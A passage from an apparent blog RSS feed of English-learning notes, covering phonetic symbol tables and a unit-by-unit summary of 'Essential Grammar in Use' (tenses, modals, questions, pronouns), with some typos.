&lt;td style="text-align:center">aʊ&lt;/td>
&lt;td style="text-align:center">aʊ&lt;/td>
&lt;td style="text-align:center">aᴜ&lt;/td>
&lt;td style="text-align:center">aʊ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">CHOICE&lt;/td>
&lt;td style="text-align:center">ɔi&lt;/td>
&lt;td style="text-align:center">ɔɪ&lt;/td>
&lt;td style="text-align:center">ɔɪ&lt;/td>
&lt;td style="text-align:center">ɔɪ&lt;/td>
&lt;td style="text-align:center">ɔɪ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">NEAR&lt;/td>
&lt;td style="text-align:center">iə&lt;/td>
&lt;td style="text-align:center">ɪə&lt;/td>
&lt;td style="text-align:center">ɪə&lt;/td>
&lt;td style="text-align:center">ɪr~ɪə&lt;/td>
&lt;td style="text-align:center">ɪr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">SQUARE&lt;/td>
&lt;td style="text-align:center">ɛə&lt;/td>
&lt;td style="text-align:center">eə&lt;/td>
&lt;td style="text-align:center">ɛː&lt;/td>
&lt;td style="text-align:center">ɛr~ɛə&lt;/td>
&lt;td style="text-align:center">er&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">CURE&lt;/td>
&lt;td style="text-align:center">uə&lt;/td>
&lt;td style="text-align:center">ʊə&lt;/td>
&lt;td style="text-align:center">ʊə&lt;/td>
&lt;td style="text-align:center">ᴜr~ᴜə&lt;/td>
&lt;td style="text-align:center">ʊr&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="字典中使用的音标">字典中使用的音标&lt;/h3>
&lt;ul>
&lt;li>Oxford English Dictionary 使用 Upton + K&amp;amp;K 音标&lt;/li>
&lt;li>Cambridge Dictionary 使用 Gimson + Roach 音标, &lt;a href="./assets/pdfs/Cambridge-English-Pronouncing-Dictionary.pdf">Cambridge English Pronouncing Dictionary&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="英式-vs-美式">英式 vs 美式&lt;/h3>
&lt;ul>
&lt;li>辅音都相同，不同在元音&lt;/li>
&lt;li>美式音标长元音没有“ː”符号&lt;/li>
&lt;li>美式音标有儿化音&lt;/li>
&lt;/ul>
&lt;h2 id="其他">其他&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://www.yek.me.uk/gavgb.html">GA and GB Pronunciations of English&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docs: Essential Grammars in Use</title><link>https://note.codiy.net/docs/2022/01/essential-grammars-in-use/</link><pubDate>Wed, 05 Jan 2022 13:11:52 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/essential-grammars-in-use/</guid><description>
&lt;h2 id="1-tenses">1 Tenses&lt;/h2>
&lt;p>Unit001 - Unit028&lt;/p>
&lt;h3 id="11-present-continuous">1.1 Present Continuous&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>am/is/are&lt;/strong> + &lt;strong>-ing&lt;/strong> = something is happening now&lt;/li>
&lt;li>short form &lt;code>you're not&lt;/code> or &lt;code>you aren't&lt;/code>&lt;/li>
&lt;li>short answers&lt;/li>
&lt;li>positive, negative, question&lt;/li>
&lt;li>&lt;strong>having&lt;/strong>, &lt;strong>doing&lt;/strong>&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Some verbs don&amp;rsquo;t be used in the present continuous&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;/th>
&lt;th>&lt;/th>
&lt;th>&lt;/th>
&lt;th>&lt;/th>
&lt;th>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>want&lt;/td>
&lt;td>like&lt;/td>
&lt;td>know&lt;/td>
&lt;td>prefer&lt;/td>
&lt;td>believe&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>need&lt;/td>
&lt;td>mean&lt;/td>
&lt;td>forget&lt;/td>
&lt;td>remember&lt;/td>
&lt;td>understand&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/blockquote>
&lt;h3 id="12-present-simple">1.2 Present Simple&lt;/h3>
&lt;p>We use the present simple &lt;strong>for things that are ture in general&lt;/strong>, or &lt;strong>for things that happen sometimes or all the time&lt;/strong>.&lt;/p>
&lt;ul>
&lt;li>use &lt;strong>do/does&lt;/strong> for negative form and question form&lt;/li>
&lt;li>do/does + infinitive&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Common Mistake: [Unit009]&lt;/p>
&lt;ul>
&lt;li>&lt;strong>I have&lt;/strong> = &lt;strong>I have got&lt;/strong>&lt;/li>
&lt;li>&lt;strong>I don&amp;rsquo;t have&lt;/strong> = &lt;strong>I haven&amp;rsquo;t got&lt;/strong>&lt;/li>
&lt;li>&lt;strong>Do you have&lt;/strong> = &lt;strong>Have you got&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="13-past-simple">1.3 Past Simple&lt;/h3>
&lt;ul>
&lt;li>The past simple is often -ed.&lt;/li>
&lt;li>use &lt;strong>did&lt;/strong> for negative form and question form&lt;/li>
&lt;li>verb forms(infinitive, past simple, past participle)&lt;/li>
&lt;li>some past simple irrgular words
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/69e1d1b401d3f37d62d9a498c03cd2dc1627114452.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h3 id="14-past-continuous">1.4 Past Continuous&lt;/h3>
&lt;ul>
&lt;li>was/were + -ing&lt;/li>
&lt;/ul>
&lt;h3 id="15-present-perfect">1.5 Present Perfect&lt;/h3>
&lt;ul>
&lt;li>has/have done (positive, negative, question)&lt;/li>
&lt;li>&lt;strong>the past simple&lt;/strong> vs &lt;strong>the past participle&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/a129e87144be4c4f124f256c243648a71627114740.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>has/have &lt;strong>just&lt;/strong>&lt;/li>
&lt;li>has/have &lt;strong>already&lt;/strong>&lt;/li>
&lt;li>hasn&amp;rsquo;t/haven&amp;rsquo;t&amp;hellip;&lt;strong>yet&lt;/strong>(yet = until now)&lt;/li>
&lt;li>Have you &lt;strong>ever&lt;/strong> &amp;hellip;?&lt;/li>
&lt;li>[Unit017] &lt;strong>gone&lt;/strong> and &lt;strong>been&lt;/strong>&lt;/li>
&lt;li>How long have you &amp;hellip;?&lt;/li>
&lt;li>&lt;strong>for&lt;/strong>, &lt;strong>since&lt;/strong>, &lt;strong>ago&lt;/strong>
&lt;ul>
&lt;li>ago = before now, we use &lt;strong>ago&lt;/strong> in past simple&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="16-passive">1.6 Passive&lt;/h3>
&lt;ul>
&lt;li>[Unit021] am/is/are/was/were + past participle
&lt;ul>
&lt;li>&lt;code>Butter is made from milk&lt;/code>&lt;/li>
&lt;li>&lt;code>How often are these rooms cleaned&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>was/were born&lt;/strong>&lt;/li>
&lt;li>passive + by &amp;hellip; &lt;code>I was bitten by a dog a few days ago&lt;/code>&lt;/li>
&lt;li>&lt;strong>is/are being&lt;/strong> (present continuous passive)
&lt;ul>
&lt;li>&lt;code>Somebody is painting the door&lt;/code>&lt;/li>
&lt;li>&lt;code>The door is being painted&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>has/have been&lt;/strong> (present perface passive)
&lt;ul>
&lt;li>&lt;code>Somebody has painted the door&lt;/code>&lt;/li>
&lt;li>&lt;code>The door has been pained&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Compare &lt;strong>the present prefect&lt;/strong> and &lt;strong>the past simple&lt;/strong> in &lt;strong>passive&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;code>The room isn't dirty any more. It has been cleaned.&lt;/code>&lt;/li>
&lt;li>&lt;code>The room was cleaned yesterday.&lt;/code> (May be it&amp;rsquo;s dirty now)&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="17-future">1.7 Future&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>am/is/are&lt;/strong> + &lt;strong>-ing&lt;/strong> (have arranged)
&lt;ul>
&lt;li>&lt;code>Andrew is playing tennis tomorrow&lt;/code>&lt;/li>
&lt;li>&lt;code>I'm not working next week&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>present simple&lt;/strong> (for timetables, programmes, trains, buses)
&lt;ul>
&lt;li>&lt;code>The train arrives at 7.30.&lt;/code>&lt;/li>
&lt;li>&lt;code>What time does the film finish&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>am/is/are going to&lt;/strong> (have decided)
&lt;ul>
&lt;li>&lt;code>I'm going to watch TV this evening&lt;/code>&lt;/li>
&lt;li>Something &lt;strong>is going to happen&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>will/shall&lt;/strong> (offer something or decide to do something)
&lt;ul>
&lt;li>I &lt;strong>think&lt;/strong> &amp;hellip; &lt;strong>will&lt;/strong>&amp;hellip;&lt;/li>
&lt;li>I shall, we shall, Shall I, Shall we&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Remember:&lt;/p>
&lt;ul>
&lt;li>We don&amp;rsquo;t use &lt;strong>will&lt;/strong> for things we have already arranged or decided to do
&lt;ul>
&lt;li>&lt;code>We're going to the cinema on Saturday. Do you want to come with us&lt;/code> (not We will go)&lt;/li>
&lt;li>&lt;code>I'm not working tomorrow&lt;/code> (not I won&amp;rsquo;t work)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="2-modals-imperative-etc">2 Modals, imperative (etc.)&lt;/h2>
&lt;p>Unit029 - Unit036&lt;/p>
&lt;h3 id="21-will-shall">2.1 Will, Shall&lt;/h3>
&lt;ul>
&lt;li>will + infinitive&lt;/li>
&lt;li>I think &amp;hellip; will&amp;hellip;&lt;/li>
&lt;li>I shall, we shall, Shall I, Shall we&lt;/li>
&lt;/ul>
&lt;h3 id="22-might-may">2.2 Might, May&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>might&lt;/strong> = &lt;strong>may&lt;/strong> (It is possible that &amp;hellip; will)
&lt;ul>
&lt;li>&lt;code>I might go to the ciname this evening, but I'm not sure&lt;/code>&lt;/li>
&lt;li>&lt;code>Take an umbrella with you. It might rain&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>might not&lt;/strong> (It is possible that &amp;hellip; will not)
&lt;ul>
&lt;li>&lt;code>I might not go to work tomorrow&lt;/code>&lt;/li>
&lt;li>&lt;code>Sue might not come to the party&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>May I &amp;hellip;&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="23-can-could">2.3 Can, Could&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>I know how to do&lt;/strong>&lt;/li>
&lt;li>&lt;strong>it is possible for me to do it&lt;/strong>&lt;/li>
&lt;li>For the past, we use &lt;strong>could/couldn&amp;rsquo;t&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="24-must-mustnt-dont-need-to">2.4 Must, Mustn&amp;rsquo;t, Don&amp;rsquo;t need to&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>must&lt;/strong> (need to do)
&lt;ul>
&lt;li>&lt;code>I must eat something&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>mustn&amp;rsquo;t&lt;/strong> (It is &lt;strong>necessary&lt;/strong> not to do it)
&lt;ul>
&lt;li>&lt;code>I mustn't be late&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>don&amp;rsquo;t need to&lt;/strong> = &lt;strong>don&amp;rsquo;t have to&lt;/strong> (It is &lt;strong>not necessary&lt;/strong>)
&lt;ul>
&lt;li>&lt;code>I don't need to go yet. I can stay a little longer&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>For the past, we use &lt;strong>had to &amp;hellip;&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;code>I was very hungry. I had to eat something&lt;/code>&lt;/li>
&lt;li>&lt;code>We had to walk home last night&lt;/code>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="25-have-to">2.5 Have to&lt;/h3>
&lt;ul>
&lt;li>The past is &lt;strong>had to &amp;hellip;&lt;/strong>&lt;/li>
&lt;li>&lt;strong>do/does/did&lt;/strong> + &lt;strong>have to&lt;/strong>, in negatives and questions
&lt;ul>
&lt;li>&lt;code>What time do you have to go to the dentist tomorrow&lt;/code>&lt;/li>
&lt;li>&lt;code>Ian doesn't have to work very hard. He's got an easy job&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Compare: [Unit033] &lt;strong>must&lt;/strong> vs &lt;strong>have to&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>use &lt;strong>must&lt;/strong> or &lt;strong>have to&lt;/strong>, when you say what you think is necessary&lt;/li>
&lt;li>use &lt;strong>must&lt;/strong> or &lt;strong>have to&lt;/strong>, when you give your opinion&lt;/li>
&lt;li>use &lt;strong>have to&lt;/strong> (not &lt;strong>must&lt;/strong>), when you aren&amp;rsquo;t giving your personal opinion.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="26-should-ought-to">2.6 Should, Ought to&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>It is good thing to do&lt;/strong>&lt;/li>
&lt;li>&lt;strong>it is the right thing to do&lt;/strong>&lt;/li>
&lt;li>I &lt;strong>think&lt;/strong> &amp;hellip; &lt;strong>should&lt;/strong> &amp;hellip;
&lt;ul>
&lt;li>&lt;code>I think Lisa should buy some new clothes&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>ought to&lt;/strong> (Another way to say &lt;strong>should&lt;/strong>)
&lt;ul>
&lt;li>&lt;code>It's a good film. You ought to go and see it&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="27-would">2.7 Would&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Would you like&lt;/strong>&amp;hellip;? (to offer things, to invite somebody)&lt;/li>
&lt;li>&lt;strong>I&amp;rsquo;d like&lt;/strong>&amp;hellip;&lt;/li>
&lt;li>&lt;strong>Would you like&lt;/strong> vs &lt;strong>Do you like&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="28-used-to">2.8 Used to&lt;/h3>
&lt;ul>
&lt;li>We use &lt;strong>used to&lt;/strong> only for &lt;strong>the past&lt;/strong>
&lt;ul>
&lt;li>&lt;code>When I was a child, I used to like chocolate&lt;/code>&lt;/li>
&lt;li>&lt;code>I used to read a lot of books, but I don't read mush these days&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>use &lt;strong>did&lt;/strong> (not &lt;strong>do/does&lt;/strong>) in negatives and questions
&lt;ul>
&lt;li>&lt;code>When I was a child, I didn't use to like chocolate&lt;/code>&lt;/li>
&lt;li>&lt;code>Where did you used to live before you came here?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="3-there-it">3 There, It&lt;/h2>
&lt;p>Unit037 - Unit039&lt;/p>
&lt;h3 id="31-there">3.1 there&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>There is/are/was/were&lt;/strong>&amp;hellip;
&lt;ul>
&lt;li>&lt;code>There's a big tree in the garden&lt;/code>&lt;/li>
&lt;li>&lt;code>Is there a hotel near here?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>There has/have/had been&lt;/strong>
&lt;ul>
&lt;li>&lt;code>There has been a big tree in the garden&lt;/code>&lt;/li>
&lt;li>&lt;code>Look! There's been an accident&lt;/code>&lt;/li>
&lt;li>&lt;code>This road is very dangerous. There's been many accidents.&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>There will be&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Do you think there will be a lot of people at the party on Saturday&lt;/code>&lt;/li>
&lt;li>&lt;strong>there won&amp;rsquo;t be&lt;/strong> = there &lt;strong>will not&lt;/strong> be&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Common Mistake: &lt;strong>There has something&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;h3 id="32-it">3.2 it&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>We use &lt;strong>it&lt;/strong> for &lt;strong>time/day/distance/weather&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/22cb94d66e79cfa1d3b8319053a4b95f1627128852.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>It&amp;rsquo;s + adjective + to&lt;/p>
&lt;ul>
&lt;li>&lt;strong>It&amp;rsquo;s nice to&lt;/strong> see you again.&lt;/li>
&lt;li>&lt;strong>It&amp;rsquo;s impossible to&lt;/strong> understand her.&lt;/li>
&lt;li>&lt;strong>It wasn&amp;rsquo;t easy to&lt;/strong> find your house&lt;/li>
&lt;li>etc.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="4-auxiliary-verbs">4 Auxiliary verbs&lt;/h2>
&lt;p>Unit040 - Unit043&lt;/p>
&lt;h3 id="41-behavedo">4.1 be/have/do&lt;/h3>
&lt;ul>
&lt;li>[Unit023] &lt;strong>be/have/do&lt;/strong> in present and past tenses&lt;/li>
&lt;/ul>
&lt;h3 id="42-i-am-i-dont">4.2 I am; I don&amp;rsquo;t&lt;/h3>
&lt;ul>
&lt;li>We dont use &lt;strong>&amp;rsquo;m/&amp;rsquo;s/&amp;rsquo;ve&lt;/strong> etc.(short froms) at the end of a sentence.
&lt;ul>
&lt;li>&lt;code>She isn't tired, but he is&lt;/code>(not but he&amp;rsquo;s)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>But you can use &lt;strong>isn&amp;rsquo;t&lt;/strong>,&lt;strong>haven&amp;rsquo;t&lt;/strong>,&lt;strong>won&amp;rsquo;t&lt;/strong> etc.(negative short form)
&lt;ul>
&lt;li>&lt;code>My sister has got a car, but I haven't&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>You can use &lt;strong>I am&lt;/strong> / &lt;strong>I am not&lt;/strong> etc. after &lt;strong>Yes&lt;/strong> and &lt;strong>No&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Are you tired? Yes, I am / No, I'm not&lt;/code>&lt;/li>
&lt;li>&lt;code>Sue works hard, but I don't&lt;/code>&lt;/li>
&lt;li>&lt;code>Did it rain yesterday? No, it didn't&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="43-have-you-are-you-dont-you-etc">4.3 Have you? Are you? Don&amp;rsquo;t you? (etc.)&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/7236a922d1b9fbce65137aa54632dbbb1627130106.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="44-tooeither-so-am-i--neither-do-i-etc">4.4 too/either, so am I / neither do I (etc.)&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Jane is a doctor. Her husband is a doctor too&lt;/code>&lt;/li>
&lt;li>&lt;code>Ben doesn't watch TV. He doesn't read newspapers either&lt;/code>&lt;/li>
&lt;li>&lt;code>I'd like to go to Australia.&lt;/code>, &lt;code>So would I&lt;/code>&lt;/li>
&lt;li>&lt;code>I'm not married&lt;/code>, &lt;code>Nor am I&lt;/code> or &lt;code>Neither am I&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="5-questions-">5 Questions (**)&lt;/h2>
&lt;p>Unit044 - Unit049&lt;/p>
&lt;h3 id="51-behavedo">5.1 Be/Have/Do&lt;/h3>
&lt;h3 id="52-whowhat">5.2 Who/What&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Who/What&lt;/strong> can be &lt;strong>Subject&lt;/strong> or &lt;strong>Object&lt;/strong> in question
&lt;ul>
&lt;li>&lt;code>Who saw you&lt;/code>, &lt;code>Who did you see&lt;/code>&lt;/li>
&lt;li>&lt;code>What happened&lt;/code>, &lt;code>What did you say&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>What&amp;rsquo;s it like&lt;/strong>, &lt;strong>What are they like&lt;/strong>
It means &lt;strong>tell me something about it/them&lt;/strong>
&lt;ul>
&lt;li>&lt;code>What's your new teacher like?&lt;/code>&lt;/li>
&lt;li>&lt;code>What was the weather like?&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="53-whowhatwichwhere-with-prepositionstofromwith-etc-at-the-end">5.3 &lt;strong>Who/What/Wich/Where&lt;/strong> with prepositions(&lt;strong>to/from/with&lt;/strong> etc.) at the end&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Where are you from?&lt;/code>&lt;/li>
&lt;li>&lt;code>Who is she talking to?&lt;/code>&lt;/li>
&lt;li>&lt;code>Which hospital is he in?&lt;/code>&lt;/li>
&lt;li>&lt;code>What do you want to talk about?&lt;/code>&lt;/li>
&lt;li>&lt;code>What is it like?&lt;/code> (&lt;strong>like&lt;/strong> is a preposition here, not the verb &lt;strong>like&lt;/strong>)&lt;/li>
&lt;/ul>
&lt;h3 id="54-how-long-does-it-take-">5.4 How long does it take &amp;hellip;?&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>How long does it take&lt;/strong> from &amp;hellip; to &amp;hellip;?
&lt;ul>
&lt;li>&lt;code>How long does it take by plane form New York to Washingron?&lt;/code>&lt;/li>
&lt;li>&lt;code>It takes an hour&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>How long does it take [somebody] to&lt;/strong> do something?
&lt;ul>
&lt;li>&lt;code>How long will it take to get from here to the hotel?&lt;/code>&lt;/li>
&lt;li>&lt;code>How long did it take you to read this book?&lt;/code>&lt;/li>
&lt;li>&lt;code>It took me three days to read it&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="55-clause-question">5.5 Clause Question&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/35b6c305189e3e431c8cb7e29b1bdd1e1627134771.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Questions &lt;strong>with&lt;/strong> &lt;strong>do/does/did&lt;/strong> (present simple and past simple)&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Do you know&lt;/strong> + [how|what|why|where|which] + clause&lt;/li>
&lt;li>&lt;strong>I know&lt;/strong> + [how|what|why|where|which] + clause
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/7f2a8a317eee557b60fc23f1817cc7401627135107.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Questions &lt;strong>beginning&lt;/strong> &lt;strong>Is &amp;hellip;?&lt;/strong> / &lt;strong>Do &amp;hellip;?&lt;/strong> / &lt;strong>Can &amp;hellip;?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Do you know&lt;/strong> + [if|whether] + clause&lt;/li>
&lt;li>&lt;strong>I don&amp;rsquo;t know&lt;/strong> + [if|whether] + clause
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/4e582c3ecb74bbba6a6d518d99070c941627135164.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="6-reported-speech">6 Reported speech&lt;/h2>
&lt;p>Unit050&lt;/p>
&lt;ul>
&lt;li>She said that &amp;hellip; He told me that &amp;hellip;
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/6ecc90ab03ef650b5fb53d66ee0639691627135460.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h2 id="7--ing-and-to">7 -ing and to&lt;/h2>
&lt;p>Unit051 - Unit054&lt;/p>
&lt;h3 id="71-infinitive">7.1 Infinitive&lt;/h3>
&lt;ul>
&lt;li>modal verbs + infinitive&lt;/li>
&lt;li>do/does/did + infinitive&lt;/li>
&lt;li>to + infinitive&lt;/li>
&lt;/ul>
&lt;h3 id="72--ing-or-infinitive">7.2 -ing or infinitive&lt;/h3>
&lt;ul>
&lt;li>am/is/are/was/were + -ing&lt;/li>
&lt;li>Verb + Verb
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/90cb4997dea1acc4bfc63a10c77c62481627184209.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>Verb + somebody + to do something
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/9cf91c299aa00d7ac6d182b0d190ad371627184483.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>&lt;strong>make&lt;/strong> and &lt;strong>let&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/c3cf83ba6cec248d8a8995a1e543d4241627184602.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;li>&lt;strong>to&lt;/strong> vs &lt;strong>for&lt;/strong> (to + verb, for + noun)
&lt;strong>tell us why a person does something&lt;/strong>
&lt;ul>
&lt;li>&lt;code>I went to the shop to get a newspaper&lt;/code>&lt;/li>
&lt;li>&lt;code>I went to the shop for a newspaper&lt;/code>&lt;/li>
&lt;li>&lt;strong>&lt;code>I went to the shop to get a newspaper for my mother&lt;/code>&lt;/strong>&lt;/li>
&lt;li>&lt;code>Give the newspaper to me&lt;/code>&lt;/li>
&lt;li>&lt;code>I bought a newspaper for my mother&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>wait for, wait to, wait for xxx to xxx&lt;/li>
&lt;/ul>
&lt;h2 id="8-go-get-do-make-have">8 Go, Get, Do, Make, Have&lt;/h2>
&lt;p>Unit055 - Unit058&lt;/p>
&lt;h3 id="81-go">8.1 Go&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/4aa71d2e6069cf39afb26d0542e5aa781627184985.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="82-get">8.2 Get&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/328ee2119bfec240b6cdfb3c5af2366e1627185045.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="83-do-and-make">8.3 Do and Make&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/ebb08d00141cd647d9ffe6af356f1ea91627185146.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="84-havehave-got">8.4 Have/Have got&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/d49a733f057df972b9481b558ff1a9541627185206.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;blockquote>
&lt;p>Common Mistake:&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;quot;I have no children&amp;quot;&lt;/code> (ok)&lt;/li>
&lt;li>&lt;code>&amp;quot;I haven't children&amp;quot;&lt;/code> (error)&lt;/li>
&lt;li>&lt;code>&amp;quot;I haven't any children&amp;quot;&lt;/code> (error)&lt;/li>
&lt;li>&lt;code>&amp;quot;I don't have any children&amp;quot;&lt;/code> (ok)&lt;/li>
&lt;li>&lt;code>&amp;quot;I haven't got any children&amp;quot;&lt;/code> (ok)&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="9-pronouns-and-possesives">9 Pronouns and Possesives&lt;/h2>
&lt;p>Unit59 - Unit 64&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>subject&lt;/th>
&lt;th>object&lt;/th>
&lt;th>subject&lt;/th>
&lt;th>object&lt;/th>
&lt;th>object&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>me&lt;/td>
&lt;td>my&lt;/td>
&lt;td>mine&lt;/td>
&lt;td>myself&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>you&lt;/td>
&lt;td>you&lt;/td>
&lt;td>your&lt;/td>
&lt;td>yours&lt;/td>
&lt;td>yourslef,yourselves&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>we&lt;/td>
&lt;td>us&lt;/td>
&lt;td>our&lt;/td>
&lt;td>ours&lt;/td>
&lt;td>ourselves&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>she&lt;/td>
&lt;td>her&lt;/td>
&lt;td>her&lt;/td>
&lt;td>hers&lt;/td>
&lt;td>herself&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>he&lt;/td>
&lt;td>him&lt;/td>
&lt;td>his&lt;/td>
&lt;td>his&lt;/td>
&lt;td>himself&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>they&lt;/td>
&lt;td>them&lt;/td>
&lt;td>their&lt;/td>
&lt;td>theirs&lt;/td>
&lt;td>themselves&lt;/td>
&lt;/tr>
&lt;/tbody>
